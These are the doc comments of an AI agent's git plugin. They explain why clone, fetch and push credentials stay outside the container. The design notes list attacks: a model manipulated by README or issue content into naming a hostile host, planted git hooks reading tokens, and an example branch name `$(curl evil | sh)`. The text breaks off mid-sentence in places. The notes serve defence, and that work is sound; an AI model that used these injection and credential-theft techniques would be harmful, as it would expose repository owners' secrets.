/**
 * `@dynamicagents/plugins/repo` — clone, commit, push, open a pull request.
 *
 * Layered over a container rather than owning one: it needs a shell with `git`
 * on it, and `@dynamicagents/plugins/computer` provides exactly that through
 * `computerExec`. Passing `exec` in rather than importing that plugin keeps the
 * two independent — a host with its own container can use this against that
 * instead, and the tests here need no container at all.
 *
 * ## The credential never enters the container
 *
 * The three operations that authenticate — clone, fetch, push — are not run
 * here. They go to {@link RepoConfig.git}, which the host implements on its own
 * side of the boundary. Everything else — `status`, `diff`, `add`, `commit`,
 * `checkout` — runs in the container through {@link RepoConfig.exec}, because
 * none of it needs to authenticate.
 *
 * That split is the one thing to preserve when changing this file: if an
 * operation talks to the forge it does not belong on `exec`, and if it does not,
 * it has no business anywhere else.
 *
 * It is absolute rather than careful because a narrower version does not hold.
 * Git executes whatever `.git/config` and `.git/hooks` name; both live in the
 * workspace filesystem, which outlives the container and which a co-installed
 * shell tool can write. So a model needs no credential on its *own* command — a
 * planted `pre-push` hook reads one out of the environment `repo_push` gives it.
 * Nor is that patchable key by key: a URL-specific `http.<url>.sslVerify=false`
 * in the repository's own config beats a `-c` override, because specificity
 * outranks precedence. And a credential that exists in a process environment for
 * the length of one command is readable at `/proc/<pid>/environ` by anything
 * else in the container.
 *
 * Two further rules, which are about the forge rather than the container:
 *
 * 1. **The forge is an allowlist, checked before anything runs.** A clone URL is
 *    model input — a repository README, an issue body, or a page fetched by a
 *    co-installed browser plugin is enough to choose it — and a credential
 *    offered to a host of the model's choosing is the whole game. So the URL's
 *    host must be on {@link RepoConfig.allowedHosts} before any operation
 *    starts, and the allowlist travels with each call so the host can bind the
 *    check to the moment the token would actually be handed over. `origin` is
 *    re-derived and re-checked on every push rather than remembered, because the
 *    checkout's `.git/config` is a file the container can rewrite.
 * 2. **The forge API is called from the Worker**, so the credential that can
 *    write to a repository through the API never crosses the boundary either.
 *    Every tool that reads or writes through it resolves the repository from the
 *    checkout's own origin rather than from a parameter, so there is no way to
 *    point the token at a repository nobody asked about.
 *
 * Model-authored values — URLs, branch names, commit messages — travel to the
 * container as environment variables rather than being interpolated into a
 * command, so a branch name of `$(curl evil | sh)` is inert text. That is about
 * shell injection, not credentials, and is independent of all of the above.
 *
 * A limit this plugin cannot close: the allowlist bounds the *host*, never the
 * repository. Whatever the token can reach, an agent talked into naming it can
 * reach. See the README — the token wants to be fine-grained.

 * is the trust boundary. Everything reachable through `exec` runs in the
 * container and gets **no credential**; everything here runs wherever the host
 * keeps its secret and never touches the container at all.
 *
 * That is why `clone`, `fetch` and `push` are the whole interface. They are
 * exactly the operations that talk to the forge. `status`, `diff`, `add`,
 * `commit` and `checkout` are local, need nothing to authenticate with, and stay
 * on `exec` where they are cheap and where the model can see them work.
 *
 * A host implements this against whatever git it has on its own side of the
 * boundary. The coder in `starter` runs isomorphic-git inside the
 * Durable Object that owns the workspace filesystem, so a push reads the token
 * from that object's environment and the container never holds one.
 *
 * ## Failures arrive as values
 *
 * No method here rejects for a git failure. A remote that refuses a push, a

 * One git command at a time, per plugin instance.

 * `repo_push` race: the commit fails, the push succeeds against the previous
 * state, and the round reports work that never landed.
 *
 * Held here rather than in {@link repoSurface}'s closure, because that closure
 * is too short-lived to be the boundary. Core rebuilds `mainAgentTools` every
 * turn and gives each subagent execution its own tool family, so a per-call queue
 * leaves a subagent racing its parent over one checkout — the same collision, one
 * level up. The config object is the plugin instance, and a `WeakMap` means a
 * discarded agent takes its queue with it.
 *

 * isolate, one container. Reads are serialised too — `git status` does not take
 * the lock, but ordering costs nothing at these durations and removes having to
 * be right about which commands write.
 *
 * ## The unit is a command, not a tool call
 *
 * Worth stating exactly, because the name suggests more. What is guaranteed is
 * that no two git commands run at once, which is what `.git/index.lock` needs.
 * What is *not* guaranteed is that one tool's sequence is atomic: `repo_push`
 * issues nine commands and `repo_commit` two, and another tool's command can be
 * dequeued between any of them. The shape to watch for is a branch switch landing
 * inside another tool's work —
 *
 *     repo_commit: git add -A
 *     repo_push:   git checkout -b coder/x    ← interleaves here
 *     repo_commit: git commit -m "…"          ← lands on coder/x
 *
 * — because the checked-out branch is state the whole checkout shares, so only
 * concurrent *mutating* tools can disturb it. Both calls report success.
 *
 * Accepted rather than closed, because reaching it takes two repo tool calls in
 * flight against one checkout from one agent, and that is not how the coder
 * drives them. If it is ever observed, the fix is to take the lock once around
 * each tool body instead of around each command — which means the runners below
 * must stop taking it themselves, since a nested take on a promise chain waits
 * on a tail its own caller is still holding.
